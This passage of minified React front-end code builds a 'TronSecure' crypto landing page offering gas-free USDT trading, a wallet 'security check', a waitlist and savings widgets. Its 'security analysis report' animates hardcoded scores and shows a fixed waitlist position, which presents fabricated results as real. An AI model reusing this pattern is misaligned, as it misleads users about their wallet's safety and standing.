            className: " w-full flex md:items-center md:justify-between lg:items-center lg:justify-between  space-y-4 md:space-y-0 lg:space-y-0  flex-col md:flex-row border-[0.1px] border-[#E9D5FF] rounded-xl shadow-sm  bg-[#FAF5FF]  p-5 ",
            children: [L.jsxs("nav", {
                className: "flex flex-row    gap-4 text-center ",
                children: [L.jsx("span", {
                    className: "bg-white w-14 h-14 rounded-full flex items-center justify-center   text-yellow-500",
                    children: L.jsx(lu, {
                        className: "w-7 h-7"
                    })
                }), L.jsxs("span", {
                    className: "flex flex-col items-start justify-center",
                    children: [L.jsx("p", {
                        children: "Current Gas Price"
                    }), L.jsxs("h1", {
                        className: "text-xl font-bold",
                        children: ["$", a]
                    })]
                })]
            }), L.jsxs("nav", {
                className: "flex flex-row   gap-4 text-center ",
                children: [L.jsx("span", {
                    className: "bg-white w-14 h-14 rounded-full flex items-center justify-center text-purple-600",
                    children: L.jsx(GV, {
                        className: "w-7 h-7"
                    })
                }), L.jsxs("span", {
                    className: "flex flex-col items-start justify-center",
                    children: [L.jsx("p", {
                        children: "Users in Waitlist"
                    }), L.jsx("h1", {
                        className: "text-xl font-bold",
                        children: f
                    })]
                })]
            }), L.jsxs("nav", {
                className: "flex flex-row    gap-4 text-center ",
                children: [L.jsx("span", {
                    className: "bg-white w-14 h-14 rounded-full flex items-center justify-center font-bold text-green-500",
                    children: L.jsx(KV, {
                        className: "w-7 h-7"
                    })
                }), L.jsxs("span", {
                    className: "flex flex-col items-start justify-center",
                    children: [L.jsx("p", {
                        children: "Joined Last Hour"
                    }), L.jsxs("h1", {
                        className: "text-xl font-bold",
                        children: ["+", p]
                    })]
                })]
            })]
        }), L.jsxs("div", {
            className: "flex flex-col w-full  space-y-5 border-[0.1px] border-[#E9D5FF] p-6  rounded-xl  bg-white ",
            children: [L.jsx("h3", {
                className: "oswald-heading-h3 uppercase  text-start ",
                children: "Your Potential Monthly Savings"
            }), L.jsxs("nav", {
                className: "flex flex-col w-full  items-center justify-center gap-2 text-center  ",
                children: [L.jsxs("span", {
                    className: "w-full flex items-center justify-center gap-4  ",
                    children: [L.jsx("label", {
                        htmlFor: "txnRange",
                        className: "sr-only "
                    }), L.jsx(ZV, {
                        type: "range",
                        min: "5",
                        max: "50",
                        step: "0.5",
                        value: r,
                        onChange: v => e(Number(v.target.value)),
                        className: `
  w-full h-2 appearance-none rounded-lg cursor-pointer
  [&::-webkit-slider-thumb]:appearance-none
  [&::-webkit-slider-thumb]:h-5
  [&::-webkit-slider-thumb]:w-5
  [&::-webkit-slider-thumb]:rounded-full
  [&::-webkit-slider-thumb]:bg-white
  [&::-webkit-slider-thumb]:border-2
  [&::-webkit-slider-thumb]:border-gray-800
  [&::-webkit-slider-thumb]:relative
  [&::-webkit-slider-thumb]:z-10

  [&::-moz-range-thumb]:bg-white
  [&::-moz-range-thumb]:border-2
  [&::-moz-range-thumb]:border-gray-800
`,
                        style: {
                            background: `linear-gradient(to right, black ${(r - 5) * 100 / 45}%, #e5e7eb ${(r - 5) * 100 / 45}%)`
                        },
                        title: "Transaction range slider"
                    })]
                }), L.jsxs("span", {
                    className: "flex flex-row  w-full items-center justify-between text-start ",
                    children: [L.jsx("p", {
                        children: "5 Txns/day"
                    }), L.jsx("p", {
                        children: "50 Txns/day"
                    })]
                })]
            }), L.jsxs("nav", {
                className: "w-full flex items-center justify-center flex-col gap-1 ",
                children: [L.jsxs("h1", {
                    className: "text-2xl font-bold text-purple-600",
                    children: ["$", s]
                }), L.jsx("p", {
                    className: "text-gray-600 font-medium",
                    children: "saved per month "
                }), L.jsxs("span", {
                    className: "text-[12px]  text-gray-700",
                    children: [r, " Txns/day"]
                })]
            })]
        }), L.jsx("div", {
            className: "w-full flex items-center justify-center text-start",
            children: L.jsx("nav", {
                className: "flex items-start w-full h-10   ",
                children: L.jsx("h1", {
                    className: "text-2xl font-stretch-125% font-extrabold text-pretty uppercase  text-start  text-purple-900",
                    children: "Early Access Benefits"
                })
            })
        }), L.jsxs("div", {
            className: "w-full flex  flex-col md:flex-row lg:flex-row items-start gap-4  justify-between  ",
            children: [L.jsxs("nav", {
                className: "flex flex-row  items-center justify-center gap-2 text-center",
                children: [L.jsx("p", {
                    className: " w-12 h-10 rounded-full flex items-center justify-center  font-bold  bg-purple-500 text-white text-md ",
                    children: "1"
                }), L.jsx("p", {
                    className: "flex primarry-page w-full border-[#E9D5FF] border-1  rounded-full bg-white p-2",
                    children: "Priority Access to Gas-Free Transactions"
                })]
            }), L.jsxs("nav", {
                className: "flex flex-row  items-center justify-center gap-2 text-center",
                children: [L.jsx("p", {
                    className: " w-12 h-10 rounded-full flex items-center justify-center  font-bold  bg-purple-500 text-white text-md ",
                    children: "1"
                }), L.jsx("p", {
                    className: "flex primarry-page w-full border-[#E9D5FF] border-1  rounded-full bg-white p-2",
                    children: "Extended Free Trial Period (30 Days)"
                })]
            }), L.jsxs("nav", {
                className: "flex flex-row  items-center justify-center gap-2 text-center",
                children: [L.jsx("p", {
                    className: " w-12 h-10 rounded-full flex items-center justify-center  font-bold  bg-purple-500 text-white text-md ",
                    children: "1"
                }), L.jsx("p", {
                    className: "flex primarry-page w-full border-[#E9D5FF] border-1  rounded-full bg-white p-2",
                    children: " Founding Member Badge & Premium Support"
                })]
            })]
        }), L.jsxs("div", {
            className: "flex flex-col sm:flex-col md:flex-row items-center justify-between   rounded-md  w-full border bg-[#581C87] p-6 gap-4",
            children: [L.jsxs("nav", {
                className: "flex flex-col   items-center justify-center  text-center ",
                children: [L.jsx("h1", {
                    className: "flex font-xl uppercase font-extrabold shadow-3xl text-white",
                    children: "Your Waitlist Position"
                }), L.jsx("p", {
                    className: "text-[#e9d5ff] font-sans text-sm",
                    children: "Earlier you join, better the benefits"
                })]
            }), L.jsxs("nav", {
                className: "flex flex-row  items-center justify-center  gap-4  ",
                children: [L.jsx("h1", {
                    className: "text-white text-5xl font-extrabold ",
                    children: "#527"
                }), L.jsx("a", {
                    href: "/dashboard",
                    children: L.jsxs(dn, {
                        className: "flex flex-row p-6 bg-[#8a35d4] hover:bg-[#7E22CE] primarry-page cursor-pointer transition duration-150",
                        children: ["Join Now ", L.jsx(MV, {})]
                    })
                })]
            })]
        })]
    })
}
;
function aM(r) {
    return Pr({
        attr: {
            viewBox: "0 0 448 512"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M438.6 278.6c12.5-12.5 12.5-32.8 0-45.3l-160-160c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3L338.8 224 32 224c-17.7 0-32 14.3-32 32s14.3 32 32 32l306.7 0L233.4 393.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l160-160z"
            },
            child: []
        }]
    })(r)
}
function i8(r) {
    return Pr({
        attr: {
            viewBox: "0 0 512 512"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M464 256A208 208 0 1 0 48 256a208 208 0 1 0 416 0zM0 256a256 256 0 1 1 512 0A256 256 0 1 1 0 256zm169.8-90.7c7.9-22.3 29.1-37.3 52.8-37.3l58.3 0c34.9 0 63.1 28.3 63.1 63.1c0 22.6-12.1 43.5-31.7 54.8L280 264.4c-.2 13-10.9 23.6-24 23.6c-13.3 0-24-10.7-24-24l0-13.5c0-8.6 4.6-16.5 12.1-20.8l44.3-25.4c4.7-2.7 7.6-7.7 7.6-13.1c0-8.4-6.8-15.1-15.1-15.1l-58.3 0c-3.4 0-6.4 2.1-7.5 5.3l-.4 1.2c-4.4 12.5-18.2 19-30.6 14.6s-19-18.2-14.6-30.6l.4-1.2zM224 352a32 32 0 1 1 64 0 32 32 0 1 1 -64 0z"
            },
            child: []
        }]
    })(r)
}
const s8 = ({icon: r, title: e, desc: t, iconBg: o, iconColor: i}) => L.jsxs("div", {
    className: " flex items-start space-x-4",
    children: [L.jsx("div", {
        className: "w-10 h-10 flex items-center justify-center rounded-full bg-{iconBg} text-{icon} ",
        style: {
            backgroundColor: o,
            color: i
        },
        children: r
    }), L.jsxs("div", {
        children: [L.jsx("h3", {
            className: "oswald-heading-secondary  uppercase",
            children: e
        }), L.jsx("p", {
            className: " text-gray-500 text-sm sm:text-base",
            children: t
        })]
    })]
})
  , XV = "/assets/gif1-unscreen-B9sTiUkg.gif"
  , JV = () => L.jsxs("div", {
    className: "grid grid-cols-1 lg:grid-cols-2 items-center justify-center md:grid-cols-2 gap-12 px-8 md:px-0 lg:px-0 ",
    children: [L.jsxs("div", {
        className: "flex flex-col gap-2",
        children: [L.jsxs("div", {
            className: "flex items-center gap-2 w-full ",
            children: [L.jsx("span", {
                className: "w-10 h-10 flex items-center justify-center rounded-md bg-[#F3E8FF] text-[#9333EA]",
                children: L.jsx(lu, {
                    size: 18
                })
            }), L.jsx("h4", {
                className: "oswald-heading-h4 uppercase ",
                children: "Energy Delegation"
            })]
        }), L.jsx("div", {
            className: " h-52 bg-gradient-to-b from-[#F2F2F2] to-[#E6E3E8] rounded-md flex items-center justify-center ",
            children: L.jsx("img", {
                src: XV,
                alt: "Energy Delegation",
                className: "w-full h-full object-cover",
                onError: r => {
                    r.target.style.display = "none"
                }
            })
        }), L.jsxs("div", {
            className: "flex justify-between items-center w-full",
            children: [L.jsxs("div", {
                className: "w-full  ",
                children: [L.jsx("span", {
                    className: "text-gray-400 text-xs",
                    children: "Gas-Free Transactions"
                }), L.jsx("div", {
                    className: "flex gap-2 items-center text-sm",
                    children: L.jsx("p", {
                        className: "font-bold text-black",
                        children: "5/day"
                    })
                })]
            }), L.jsx("a", {
                href: "/dashboard",
                children: L.jsx(dn, {
                    className: "h-10 w-24 px-4 text-sm font-medium bg-[#9333EA] hover:bg-[#7E22CE] transition-all duration-700",
                    children: "Start Trial"
                })
            })]
        })]
    }), L.jsxs("div", {
        className: "flex flex-col gap-2",
        children: [L.jsxs("div", {
            className: "flex items-center gap-2 w-full ",
            children: [L.jsx("span", {
                className: "w-8 h-8 flex items-center justify-center rounded-md bg-[#F3E8FF] text-[#9333EA]",
                children: L.jsx(Gs, {
                    size: 18
                })
            }), L.jsx("h4", {
                className: "oswald-heading-h4 uppercase ",
                children: "Wallet Verification"
            })]
        }), L.jsx("div", {
            className: " h-52 bg-gradient-to-b from-[#F2F2F2] to-[#E6E3E8] rounded-md flex items-center justify-center ",
            children: L.jsx("img", {
                src: rM,
                alt: "Energy Delegation",
                className: "w-full h-full ",
                onError: r => {
                    r.target.style.display = "none"
                }
            })
        }), L.jsxs("div", {
            className: "flex justify-between items-center w-full",
            children: [L.jsxs("div", {
                className: "w-full  ",
                children: [L.jsx("span", {
                    className: "text-gray-400 text-xs",
                    children: "Gas-Free Transactions"
                }), L.jsxs("div", {
                    className: "flex gap-2 items-center text-sm",
                    children: [L.jsx("p", {
                        className: "text-gray-400 line-through",
                        children: "$10/scan"
                    }), L.jsx("p", {
                        className: "font-bold text-black",
                        children: "FREE"
                    })]
                })]
            }), L.jsx("a", {
                href: "/dashboard",
                children: L.jsx(dn, {
                    className: "h-10 w-24 px-4 text-sm font-medium  bg-[#9333EA] hover:bg-[#7E22CE] transition-all duration-700",
                    children: "Start Trial"
                })
            })]
        })]
    })]
})
  , QV = () => L.jsxs("section", {
    className: "w-full  mt-23 md:mt-0 lg:mt-0  grid grid-cols-1 sm:grid-col-2 md:grid-col-2 lg:grid-cols-2  gap-y-10 md:gap-4 lg:gap-4  md:py-40 lg:py-40  ppx-8 md:px-24 lg:px-24",
    children: [L.jsxs("div", {
        className: `flex flex-col gap-y-8 px-8  md:px-0
         lg:px-0`,
        children: [L.jsx("h1", {
            className: "oswald-heading-h1 text-4xl md:text-5xl lg:text-6xl font-bold uppercase tracking-tight text-gray-900 ",
            children: "Tired of high gas fees and unsafe USDT trading?"
        }), L.jsx("p", {
            className: "text-xl font-sans  text-gray-600",
            children: "Experience the future of secure and efficient USDT trading with TronSecure. Say goodbye to high gas fees and hello to peace of mind."
        }), L.jsxs("div", {
            className: "space-y-6",
            children: [L.jsx(s8, {
                icon: L.jsx(lu, {
                    size: 26
                }),
                title: "Gas Free Trading",
                desc: "Enjoy up to 5 free daily transactions with instant energy delegation.",
                iconBg: "#F3E8FF",
                iconColor: "#9333EA"
            }), L.jsx(s8, {
                icon: L.jsx(Gs, {
                    size: 26
                }),
                title: "Secure Payments",
                desc: "Transact with confidence and bank-level encryption.",
                iconBg: "#F3E8FF",
                iconColor: "#22C55E"
            })]
        }), L.jsxs("div", {
            className: "flex flex-col sm:flex-row gap-4 ",
            children: [L.jsx("a", {
                href: "/dashboard",
                children: L.jsxs(dn, {
                    className: "inline-flex items-center justify-center text-sm  gap-2 hover:gap-4 whitespace-nowrapv  p-6 w-48  bg-[#9333EA] hover:bg-black text-white font-medium rounded-md transition-all duration-700",
                    children: ["Start Free Trial ", L.jsx(aM, {
                        className: "ml-2 h-4 w-4 transition-transform group-hover:translate-x-1"
                    })]
                })
            }), L.jsx("a", {
                href: "/dashboard",
                children: L.jsxs(dn, {
                    className: "inline-flex items-center justify-center   gap-2 hover:gap-4 whitespace-nowrapv  p-6 w-44 bg-transparent hover:bg-transparent    border-[#9333EA] border-1 text-sm font-medium text-[#93333EA] hover:text-gray-900 transition-all duration-700",
                    children: ["Verify Wallet ", L.jsx(VV, {})]
                })
            })]
        })]
    }), L.jsx(JV, {})]
});
var p3 = "Progress"
  , g3 = 100
  , [eH,Jme] = E1(p3)
  , [tH,rH] = eH(p3)
  , cM = ue.forwardRef( (r, e) => {
    const {__scopeProgress: t, value: o=null, max: i, getValueLabel: n=nH, ...s} = r;
    (i || i === 0) && !a8(i) && console.error(oH(`${i}`, "Progress"));
    const a = a8(i) ? i : g3;
    o !== null && !c8(o, a) && console.error(iH(`${o}`, "Progress"));
    const l = c8(o, a) ? o : null
      , f = Ym(l) ? n(l, a) : void 0;
    return L.jsx(tH, {
        scope: t,
        value: l,
        max: a,
        children: L.jsx(Eu.div, {
            "aria-valuemax": a,
            "aria-valuemin": 0,
            "aria-valuenow": Ym(l) ? l : void 0,
            "aria-valuetext": f,
            role: "progressbar",
            "data-state": fM(l, a),
            "data-value": l ?? void 0,
            "data-max": a,
            ...s,
            ref: e
        })
    })
}
);
cM.displayName = p3;
var lM = "ProgressIndicator"
  , uM = ue.forwardRef( (r, e) => {
    const {__scopeProgress: t, ...o} = r
      , i = rH(lM, t);
    return L.jsx(Eu.div, {
        "data-state": fM(i.value, i.max),
        "data-value": i.value ?? void 0,
        "data-max": i.max,
        ...o,
        ref: e
    })
}
);
uM.displayName = lM;
function nH(r, e) {
    return `${Math.round(r / e * 100)}%`
}
function fM(r, e) {
    return r == null ? "indeterminate" : r === e ? "complete" : "loading"
}
function Ym(r) {
    return typeof r == "number"
}
function a8(r) {
    return Ym(r) && !isNaN(r) && r > 0
}
function c8(r, e) {
    return Ym(r) && !isNaN(r) && r <= e && r >= 0
}
function oH(r, e) {
    return `Invalid prop \`max\` of value \`${r}\` supplied to \`${e}\`. Only numbers greater than 0 are valid max values. Defaulting to \`${g3}\`.`
}
function iH(r, e) {
    return `Invalid prop \`value\` of value \`${r}\` supplied to \`${e}\`. The \`value\` prop must be:
  - a positive number
  - less than the value passed to \`max\` (or ${g3} if no \`max\` prop is set)
  - \`null\` or \`undefined\` if the progress is indeterminate.

Defaulting to \`null\`.`
}
var sH = cM
  , aH = uM;
function cH({className: r, value: e, ...t}) {
    return L.jsx(sH, {
        "data-slot": "progress",
        className: Hd("bg-primary/10 relative h-2 w-full overflow-hidden rounded-full", r),
        ...t,
        children: L.jsx(aH, {
            "data-slot": "progress-indicator",
            className: "bg-[#A855F7] h-full w-full flex-1 transition-all duration-1200",
            style: {
                transform: `translateX(-${100 - (e || 0)}%)`
            }
        })
    })
}
function lH({progress: r}) {
    return L.jsxs("div", {
        className: "w-full md:w-[80%] flex items-center justify-center flex-col gap-2",
        children: [L.jsx(cH, {
            value: r,
            className: "md:w-[52%]  w-full "
        }), L.jsxs("div", {
            className: "flex items-center justify-between md:w-[52%] w-full gap-10",
            children: [L.jsx("nav", {
                className: "text-gray-500 text-[14px]",
                children: "Wallet Check"
            }), L.jsx("nav", {
                className: "text-gray-500 text-[14px]",
                children: "Join Waitlist"
            }), L.jsx("nav", {
                className: "text-gray-500 text-[14px]",
                children: "Access Platform"
            })]
        })]
    })
}
function bm(r) {
    return Pr({
        attr: {
            viewBox: "0 0 512 512"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M256 16C123.5 16 16 123.5 16 256c0 132.6 107.5 240 240 240 132.6 0 240-107.4 240-240S388.6 16 256 16zm0 60c99.4 0 180 80.6 180 180s-80.6 180-180 180S76 355.4 76 256 156.6 76 256 76zm91.3 64.2c-6.5 0-12.5 2.4-16.8 8.2-52 70.1-69 96.5-106 169.8-8.4-11.1-65.6-72.4-93.9-94.1-14.2-10.9-41.3 27.2-31.6 37.1C142.6 306.1 220.1 406 232.7 405c21.4-1.7 75.1-136.8 148.8-233.7 8-10.4-15-31.3-34.2-31.1z"
            },
            child: []
        }]
    })(r)
}
const uH = [{
    icon: L.jsx(Sq, {
        className: "w-8 h-8 text-purple-600"
    }),
    title: "Wallet Check",
    description: "Instant security scan of your wallet",
    details: ["Advanced multi-factor verification", "Real-time security analysis", "Blockchain-verified security certificate"]
}, {
    icon: L.jsx(qV, {
        className: "w-8 h-8 text-purple-600"
    }),
    title: "Join Waitlist",
    description: "Secure priority access to TronSecure.",
    details: ["Exclusive early access to platform features", "Extended 30-day free trial period", "Premium support and personalized onboarding"]
}, {
    icon: L.jsx(lu, {
        className: "w-8 h-8 text-purple-600"
    }),
    title: "Access Platform",
    description: "Start trading USDT without gas fees",
    details: ["Up to 5 daily gas-free transactions", "Instant energy delegation system", "Advanced trading features and analytics"]
}]
  , fH = ({onCardClick: r, onCardHover: e, activeStep: t=0}) => {
    const [o,i] = ue.useState(null)
      , n = a => {
        i(l => l === a ? null : a),
        r(a)
    }
      , s = ["w-0", "w-1/4", "w-2/3", "w-full"][t + 1] || "w-0";
    return L.jsxs("section", {
        className: "relative py-12  w-full",
        children: [L.jsx("div", {
            className: "absolute hidden md:flex top-1/2 left-0 right-0 h-1 bg-gray-200 mx-auto max-w-4xl transition-all duration-700",
            children: L.jsx("div", {
                className: `h-full bg-purple-500 transition-all duration-500 ${s}`
            })
        }), L.jsx("div", {
            className: "container mx-auto w-full md:px-30 lg:px-30",
            children: L.jsx("div", {
                className: "grid grid-cols-1 md:grid-cols-3 gap-10 items-start z-10 relative w-full",
                children: uH.map( (a, l) => {
                    const f = o === l;
                    return L.jsxs("div", {
                        className: "flex flex-col items-center cursor-pointer text-center gap-4 transition-all duration-1000",
                        onClick: () => n(l),
                        onMouseEnter: () => e(l),
                        children: [L.jsx("div", {
                            className: "w-20 h-20 p-4 flex items-center justify-center border-2 border-purple-300 rounded-full hover:border-purple-600 transition-all duration-200",
                            children: a.icon
                        }), L.jsxs("div", {
                            className: `bg-white w-full md:w-[320px] lg:w-[320px] max-w-md rounded-2xl shadow-sm 
  transition-all duration-[2500ms] ease-in-out overflow-hidden
  ${f ? "border-[3px] border-purple-500 min-h-[260px]" : "border border-white h-[160px]"}
  `,
                            children: [L.jsxs("div", {
                                className: " flex items-center jusctify-center flex-col text-center mt-6",
                                children: [L.jsx("h2", {
                                    className: "oswald-heading-secondary uppercase  ",
                                    children: a.title
                                }), L.jsx("p", {
                                    className: "text-gray-400 text-[16px]",
                                    children: a.description
                                })]
                            }), f && L.jsx(c3, {
                                type: "single",
                                collapsible: !0,
                                value: "item-1",
                                className: "px-6 pb-6",
                                children: L.jsxs(u3, {
                                    value: "item-1",
                                    className: "border-0 flex flex-col items-center justify-center ",
                                    children: [L.jsx(Q9, {}), L.jsx(f3, {
                                        className: "pt-2 text-left space-y-3 transition-all delay-500  ",
                                        children: a.details.map( (h, p) => L.jsxs("div", {
                                            className: "flex items-center gap-2 text-sm text-gray-400",
                                            children: [L.jsx(bm, {
                                                className: "text-green-500 text-[16px] flex-shrink-0"
                                            }), L.jsx("span", {
                                                className: "text-[16px]",
                                                children: h
                                            })]
                                        }, p))
                                    })]
                                })
                            })]
                        })]
                    }, l)
                }
                )
            })
        })]
    })
}
  , dH = () => {
    const [r,e] = ue.useState(null)
      , [t,o] = ue.useState(null)
      , i = h => {
        e(p => p === h ? null : h)
    }
      , n = h => {
        o(h)
    }
      , s = () => {
        o(null),
        e(null)
    }
      , a = r ?? t
      , f = a !== null ? [0, 50, 100][a] : 0;
    return L.jsx("div", {
        id: "howitworks",
        className: "w-full flex items-center justify-center md:px-24 px-8 bg-gradient-to-br  from-[#F9F4FE] via-50%  to-[#FEFEFF] ",
        children: L.jsxs("div", {
            className: "w-full  flex flex-col items-center jusctify-center gap-6  text-center",
            onMouseLeave: s,
            children: [L.jsx("h2", {
                className: "oswald-heading-primary uppercase",
                children: "How TronSecure Works"
            }), L.jsx(fH, {
                activeStep: a ?? 0,
                onCardClick: i,
                onCardHover: n,
                selectedCardIndex: r
            }), L.jsx(lH, {
                progress: f
            }), L.jsx("a", {
                href: "/dashboard",
                children: L.jsxs(dn, {
                    className: "flex items-center justify-center gap-2 w-full sm:w-48 h-12 text-white font-medium rounded-lg shadow-md",
                    children: ["Get Started Now ", L.jsx(aM, {})]
                })
            }), L.jsx("p", {
                className: "text-gray-600 text-[16px]",
                children: "Click on each step to learn more about the process"
            })]
        })
    })
}
;
function hH(r) {
    return Pr({
        attr: {
            viewBox: "0 0 20 20",
            fill: "currentColor",
            "aria-hidden": "true"
        },
        child: [{
            tag: "path",
            attr: {
                fillRule: "evenodd",
                d: "M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z",
                clipRule: "evenodd"
            },
            child: []
        }]
    })(r)
}
function pH(r) {
    return Pr({
        attr: {
            viewBox: "0 0 20 20",
            fill: "currentColor",
            "aria-hidden": "true"
        },
        child: [{
            tag: "path",
            attr: {
                fillRule: "evenodd",
                d: "M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z",
                clipRule: "evenodd"
            },
            child: []
        }]
    })(r)
}
function dM(r) {
    return Pr({
        attr: {
            fill: "none",
            viewBox: "0 0 24 24",
            strokeWidth: "2",
            stroke: "currentColor",
            "aria-hidden": "true"
        },
        child: [{
            tag: "path",
            attr: {
                strokeLinecap: "round",
                strokeLinejoin: "round",
                d: "M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
            },
            child: []
        }]
    })(r)
}
const y3 = () => {
    const [r,e] = ue.useState(!1)
      , [t,o] = ue.useState(!1)
      , i = () => e(n => !n);
    return ue.useEffect( () => {
        const n = () => {
            o(window.scrollY > 50)
        }
        ;
        return window.addEventListener("scroll", n),
        () => window.removeEventListener("scroll", n)
    }
    , []),
    L.jsxs("header", {
        className: `w-full px-8 md:px-24 lg:px-24 fixed top-0 left-0 right-0 z-50 transition-colors duration-300 ${t ? "bg-white shadow " : "bg-transparent"}`,
        children: [L.jsxs("nav", {
            className: "flex mx-auto items-center justify-between gap-8 h-20 px-8",
            children: [L.jsx(sM, {}), L.jsxs("ul", {
                className: " gap-x-8 hidden  md:flex lg:flex",
                children: [L.jsx("li", {
                    children: L.jsxs("a", {
                        href: "#features",
                        className: "text-gray-600 hover:text-purple-500 flex items-center gap-1",
                        children: [L.jsx(lu, {}), " Features"]
                    })
                }), L.jsx("li", {
                    children: L.jsxs("a", {
                        href: "#howitworks",
                        className: "text-gray-600 hover:text-purple-500 flex items-center gap-1",
                        children: [L.jsx(Gs, {}), " How It Works"]
                    })
                }), L.jsx("li", {
                    children: L.jsxs("a", {
                        href: "/checker",
                        className: "text-gray-600 hover:text-purple-500 flex items-center gap-1",
                        children: [L.jsx(r8, {}), " Verification Status"]
                    })
                }), L.jsx("li", {
                    children: L.jsxs("a", {
                        href: "#faq",
                        className: "text-gray-600 hover:text-purple-500 flex items-center gap-1",
                        children: [L.jsx(i8, {}), " FAQ"]
                    })
                })]
            }), L.jsx("div", {
                className: "hidden md:flex lg:flex",
                children: L.jsx(dn, {
                    className: "w-48 h-10",
                    children: L.jsxs("a", {
                        href: "/dashboard",
                        className: "flex items-center gap-2 text-sm",
                        children: [L.jsx(o8, {}), "Wallet Security Check"]
                    })
                })
            }), L.jsx("div", {
                className: "md:hidden lg:hidden h-20 flex item-center jusctify-center",
                children: L.jsx("button", {
                    onClick: i,
                    className: "text-gray-700 hover:text-purple-600 focus:outline-none",
                    children: r ? L.jsx(pH, {
                        className: "h-6 w-6"
                    }) : L.jsx(hH, {
                        className: "h-6 w-6"
                    })
                })
            })]
        }), r && L.jsx("div", {
            className: "md:hidden w-full  bg-white shadow-lg border-t  flex item-center jusctify-center px-8",
            children: L.jsxs("div", {
                className: "w-full py-4 space-y-4",
                children: [L.jsxs("ul", {
                    className: "flex flex-col gap-4  ",
                    children: [L.jsx("li", {
                        children: L.jsxs("a", {
                            onClick: () => e(!1),
                            href: "#features",
                            className: "text-gray-600 hover:text-purple-500 flex items-center gap-2",
                            children: [L.jsx(lu, {}), " Features"]
                        })
                    }), L.jsx("li", {
                        children: L.jsxs("a", {
                            onClick: () => e(!1),
                            href: "#howitworks",
                            className: "text-gray-600 hover:text-purple-500 flex items-center gap-2",
                            children: [L.jsx(Gs, {}), " How It Works"]
                        })
                    }), L.jsx("li", {
                        children: L.jsxs("a", {
                            onClick: () => e(!1),
                            href: "/chacker",
                            className: "text-gray-600 hover:text-purple-500 flex items-center gap-2",
                            children: [L.jsx(r8, {}), " Verification Status"]
                        })
                    }), L.jsx("li", {
                        children: L.jsxs("a", {
                            onClick: () => e(!1),
                            href: "#faq",
                            className: "text-gray-600 hover:text-purple-500 flex items-center gap-2",
                            children: [L.jsx(i8, {}), " FAQ"]
                        })
                    })]
                }), L.jsx(dn, {
                    className: "h-10 w-full",
                    children: L.jsxs("a", {
                        href: "/dashboard",
                        className: "flex items-center gap-2 text-sm",
                        children: [L.jsx(o8, {}), "Wallet Security Check"]
                    })
                })]
            })
        })]
    })
}
;
function hM(r) {
    return Pr({
        attr: {
            viewBox: "0 0 256 256",
            fill: "currentColor"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M232,112H136V88h8a16,16,0,0,0,16-16V40a16,16,0,0,0-16-16H112A16,16,0,0,0,96,40V72a16,16,0,0,0,16,16h8v24H24a8,8,0,0,0,0,16H56v32H48a16,16,0,0,0-16,16v32a16,16,0,0,0,16,16H80a16,16,0,0,0,16-16V176a16,16,0,0,0-16-16H72V128H184v32h-8a16,16,0,0,0-16,16v32a16,16,0,0,0,16,16h32a16,16,0,0,0,16-16V176a16,16,0,0,0-16-16h-8V128h32a8,8,0,0,0,0-16ZM112,40h32V72H112ZM80,208H48V176H80Zm128,0H176V176h32Z"
            },
            child: []
        }]
    })(r)
}
const Qg = [{
    icon: L.jsx(dM, {
        className: "text-gray-500 w-5 h-5 "
    }),
    title: "CEX Blacklist Check",
    percentage: 95
}, {
    icon: L.jsx(d3, {
        className: "text-gray-500 w-5 h-5"
    }),
    title: "Transaction Analysis",
    percentage: 87
}, {
    icon: L.jsx(hM, {
        className: "text-gray-500 w-5 h-5"
    }),
    title: "Trust Network",
    percentage: 100
}]
  , gH = () => {
    const [r,e] = ue.useState([0, 0, 0]);
    return ue.useEffect( () => {
        const n = Qg.map(l => l.percentage / 30);
        let s = 0;
        const a = setInterval( () => {
            e(l => l.map( (f, h) => f + n[h] >= Qg[h].percentage ? Qg[h].percentage : f + n[h])),
            s++,
            s >= 30 && clearInterval(a)
        }
        , 100);
        return () => clearInterval(a)
    }
    , []),
    L.jsx("div", {
        className: "w-full gap-8  p-2 ",
        children: Qg.map( (t, o) => L.jsx("div", {
            className: " flex flex-col   items-center justify-center gap-2 w-full h-16",
            children: L.jsxs("div", {
                className: "flex flex-row  w-full items-center justify-center gap-4",
                children: [L.jsx("span", {
                    className: "w-8 h-8 rounded-full bg-purple-100 flex items-center justify-center text-gray-600 ",
                    children: t.icon
                }), L.jsxs("div", {
                    className: " md:w-[88%] w-[72%] flex-col items-center space-y-2",
                    children: [L.jsx("div", {
                        className: "flex items-center",
                        children: L.jsx("p", {
                            className: "text-[14px] font-sans text-gray-800",
                            children: t.title
                        })
                    }), L.jsx("div", {
                        className: "relative w-full h-2 rounded-full flex flex-row  bg-gray-200 overflow-hidden",
                        children: L.jsx("div", {
                            className: `w-${r[o]}%  rounded-full bg-gradient-to-r from-purple-300 via-purple-500 to-purple-700 transition-all duration-100`,
                            style: {
                                width: `${r[o]}%`
                            }
                        })
                    })]
                }), L.jsx("div", {
                    className: "w-[5%]",
                    children: L.jsxs("h1", {
                        className: "text-[14px]  font-sans  text-gray-900 text-right",
                        children: [Math.round(r[o]), "%"]
                    })
                })]
            }, o)
        }, o))
    })
}
  , yH = () => L.jsxs("div", {
    className: "w-full  flex flex-col    text-center h-72 rounded-md shadow-lg  bg-white felx-items-center justify-center gap-4",
    children: [L.jsxs("div", {
        className: " flex flex-row items-start justify-start rounded-t-md  gap-4  h-16 bg-purple-100 p-2",
        children: [L.jsx("span", {
            className: "w-12 h-12  rounded-full bg-purple-100 flex items-center justify-center text-purple-500 ",
            children: L.jsx(jV, {
                className: "w-8 h-8"
            })
        }), L.jsx("h1", {
            className: "text-md md:text-2xl uppercase font-bold  pt-[6px] ",
            children: "Comprehensive Security Analysis Report"
        })]
    }), L.jsx("div", {
        children: L.jsx(gH, {})
    })]
})
  , bH = [{
    title: "CEX Blacklist Check",
